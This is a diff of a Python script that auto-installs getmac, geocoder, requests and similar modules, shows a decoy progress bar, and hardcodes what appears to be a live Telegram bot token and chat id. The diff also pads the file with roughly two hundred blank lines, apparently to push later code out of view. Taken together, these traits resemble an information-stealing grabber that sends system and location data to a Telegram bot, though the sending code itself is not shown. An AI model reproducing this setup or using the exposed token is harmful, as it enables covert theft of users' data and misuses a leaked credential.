@@ -5,13 +5,13 @@ Y = '\033[32m'
 E = '\033[0m'
 MV =  '\033[96m'
 S = '\033[93m'
-modüller= ['getmac', 'platform', 'glob', 'geocoder', 'requests','tqdm']
+modules= ['getmac', 'platform', 'glob', 'geocoder', 'requests','tqdm']
 
-for modül in modüller:
+for module in modules:
     print(MV+"installing modules...\n"+E)
-    print(M+f"{modül} module installing..."+E)
-    os.system(f'pip install {modül}')
-    print(Y+f"{modül} installed."+E)
+    print(M+f"{module} module installing..."+E)
+    os.system(f'pip install {module}')
+    print(Y+f"{module} installed."+E)
     time.sleep(0.7)
     os.system("clear")
 import requests
@@ -31,9 +31,212 @@ for i in tqdm(range((100))):
  time.sleep(0.040)
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 os.system('clear')
 token = '''6253572179:AAG5LAMoPW8EG-Iy6ImQKysTCbdBtfhpcPg'''  
-id = '''5205520205 '''  
+id = '''5205520205'''  
 
 print('')
 
